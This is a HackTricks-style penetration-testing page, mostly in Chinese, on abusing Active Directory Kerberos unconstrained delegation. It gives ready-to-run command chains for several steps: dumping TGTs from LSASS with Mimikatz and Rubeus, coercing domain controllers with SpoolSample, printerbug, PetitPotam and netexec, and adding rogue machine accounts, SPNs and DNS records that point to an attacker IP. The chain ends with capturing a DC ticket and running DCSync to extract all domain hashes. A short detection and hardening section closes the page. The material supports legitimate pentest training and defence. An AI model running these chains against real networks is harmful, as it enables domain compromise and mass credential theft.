# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

这是 Domain Administrator 可以为域内任意 **Computer** 设置的一项功能。之后，每当某个**用户登录**该 Computer 时，该用户的 **TGT 副本**都会被 DC **发送到所提供的 TGS 中，并保存在 LSASS 的内存中**。因此，如果你在该机器上拥有 Administrator 权限，就能够**转储这些票据并在任意机器上冒充这些用户**。

因此，如果某个域管理员登录到启用了 "Unconstrained Delegation" 功能的 Computer，而你在该机器上拥有本地管理员权限，那么你就能够转储该票据，并在任意位置冒充该 Domain Admin（域提权）。

你可以通过检查 [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 属性是否包含 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)，来**查找具有此属性的 Computer 对象**。你可以使用 LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ 完成此操作，这也是 powerview 的做法：
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
将 Administrator（或受害者用户）的 ticket 使用 **Mimikatz** 或 **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)** 加载到内存中。**\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**有关 ired.team 上 Unconstrained delegation 的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

如果攻击者能够**入侵一台被允许使用 "Unconstrained Delegation" 的计算机**，他就可以**诱骗**一台 **Print server** 向其**自动登录**，从而将一个 **TGT** 保存到该服务器的内存中。\
随后，攻击者可以执行 **Pass the Ticket attack 来冒充**该 Print server 计算机账户的用户。

要让 print server 向任意计算机登录，可以使用 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果 TGT 来自域控制器，你可以执行 [**DCSync attack**](acl-persistence-abuse/index.html#dcsync)，获取 DC 中的所有哈希。\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

在这里查找其他**强制身份验证**的方法：


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

任何能让受害者通过 **Kerberos** 向你的 unconstrained-delegation 主机进行身份验证的其他 coercion primitive 也同样有效。在现代环境中，这通常意味着根据可访问的 RPC surface，将经典的 PrinterBug 流程替换为 **PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN**，或基于 **WebClient/WebDAV** 的 coercion。

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation **不仅限于计算机对象**。**用户/服务账户**同样可以配置为 `TRUSTED_FOR_DELEGATION`。在这种情况下，实际要求是该账户必须接收发往其**拥有的 SPN** 的 Kerberos service tickets。

这会产生 2 条非常常见的 offensive 路径：

1. 你攻陷 unconstrained-delegation **用户账户**的密码/哈希，然后向同一账户**添加 SPN**。
2. 该账户已经拥有一个或多个 SPN，但其中一个指向**过期/已停用的 hostname**；重新创建缺失的 **DNS A record**，即可劫持身份验证流程，而无需修改 SPN 集合。<sup>[[8]](#references)</sup>

最小化 Linux 流程：
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- 当 unconstrained principal 是一个 **service account**，且你只有其凭据、没有在已加入域主机上执行代码的权限时，这一点尤其有用。
- 如果目标用户已经拥有一个**过期的 SPN**，重新创建对应的 **DNS record** 可能比向 AD 写入新的 SPN 更不易引起注意。
- 近期以 Linux 为中心的 tradecraft 使用 `addspn.py`、`dnstool.py`、`krbrelayx.py` 以及一种 coercion primitive；完成整个链条无需接触 Windows 主机。

### 滥用 Unconstrained Delegation 与攻击者创建的计算机

现代域通常将 `MachineAccountQuota > 0`（默认值为 10），允许任何已认证的 principal 创建最多 N 个计算机对象。如果你还拥有 `SeEnableDelegationPrivilege` token privilege（或等效权限），就可以将新创建的计算机设置为受信任的 unconstrained delegation 计算机，并从特权系统获取入站 TGT。<sup>[[1]](#references)</sup>

大致流程：

1) 创建一个由你控制的计算机
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) 使伪造的主机名可在域内解析
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 在攻击者控制的计算机上启用 Unconstrained Delegation
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
原理：在 unconstrained delegation 中，启用 delegation 的计算机上的 LSA 会缓存传入的 TGT。如果诱使 DC 或特权服务器向你的 fake host 进行身份验证，其 machine TGT 就会被存储，并且可以导出。

4) 以 export mode 启动 krbrelayx，并准备 Kerberos material
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) 将 authentication 从 DC/servers 强制发送到你的 fake host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx 将在计算机进行身份验证时保存 ccache 文件，例如：
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) 使用捕获的 DC machine TGT 执行 DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.
- If the victim account is marked as **"Account is sensitive and cannot be delegated"** or is a member of **Protected Users**, the forwarded TGT will not be included in the service ticket, so this chain won't yield a reusable TGT.<sup>[[9]](#references)</sup>
- If **Credential Guard** is enabled on the authenticating client/server, Windows blocks **Kerberos unconstrained delegation**, which can make otherwise valid coercion paths fail from an operator perspective.

检测与加固建议：

- 当 UAC 设置 `TRUSTED_FOR_DELEGATION` 时，针对事件 ID 4741（创建计算机账户）以及 4742/4738（修改计算机/用户账户）触发告警。
- 监控域区域中异常的 DNS A 记录添加行为。
- 关注来自非预期主机的 4768/4769 激增，以及 DC 向非 DC 主机进行身份验证的行为。
- 将 `SeEnableDelegationPrivilege` 限制给最小必要人员，在可行的情况下设置 `MachineAccountQuota=0`，并在 DC 上禁用 Print Spooler。强制启用 LDAP signing 和 channel binding。

### 缓解措施

- 将 DA/Admin 登录限制到指定服务
- 为特权账户设置 "Account is sensitive and cannot be delegated"。

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
